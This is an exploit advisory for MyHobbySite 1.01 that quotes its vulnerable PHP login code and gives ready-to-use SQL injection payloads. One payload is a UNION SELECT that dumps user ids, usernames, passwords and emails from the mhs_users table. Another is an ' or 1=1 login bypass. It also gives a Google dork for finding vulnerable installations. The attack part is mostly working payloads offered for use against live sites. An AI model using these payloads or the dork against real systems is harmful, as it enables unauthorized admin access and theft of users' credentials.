MyHobbySite 1.01 SQL Injection / Authentication Bypass Vulnerability
====================================================================

#########################################################################################
# Exploit Title: MyHobbySite 1.01 SQL injection, Bypass Authentication Vulnerability
# Date: 12-09-2010
# Author: YuGj VN
# Email: anhtuanittn.vn@gmail.com
# Software Link: http://www.myhobbysite.net/index.php?page=15
# Version: v1.01
#########################################################################################
 
Bug Code:
if (isset($_REQUEST[&#039;username&#039;]) and isset($_REQUEST[&#039;password&#039;])) {
    // Get user info from the dataabse
    $_REQUEST[&#039;username&#039;] = trim($_REQUEST[&#039;username&#039;]);
    $_REQUEST[&#039;password&#039;] = trim($_REQUEST[&#039;password&#039;]);
    $usersettings = mysql_fetch_array($usersettings);
    if ($usersettings) {
        $_SESSION[&#039;logged_in&#039;] = TRUE;
        $_SESSION[&#039;userid&#039;] = $usersettings[&#039;id&#039;];
        $_SESSION[&#039;user&#039;] = $usersettings[&#039;username&#039;];
        $_SESSION[&#039;pass&#039;] = $usersettings[&#039;password&#039;];
        $_SESSION[&#039;email&#039;] = $usersettings[&#039;email&#039;];
        $_SESSION[&#039;permissions&#039;] = $usersettings[&#039;permissions&#039;];
        UpdateLogs($usersettings[&#039;username&#039;] . " logged into the Admin CP.");
    } else {
        $failed_login = TRUE;
    }
}
 
#########################################################################################
 
Exploit:
 
link exploit:  http://domain.com/admin/
# Enter in username field: &#039; union select 1,concat_ws(0x3a,id,username,password,email),3,4,5 from mhs_users-- -
# Enter in password field: &#039; union select 1,concat_ws(0x3a,id,username,password,email),3,4,5 from mhs_users-- -
# or
# Enter in username field: &#039; or 1=1-- -
# Enter in password field: &#039; or 1=1-- -
#
#
# We can exploit only when magic_quote_gpc = Off
# Google dork: Powered by MyHobbySite 1.01
#
#
#########################################################################################



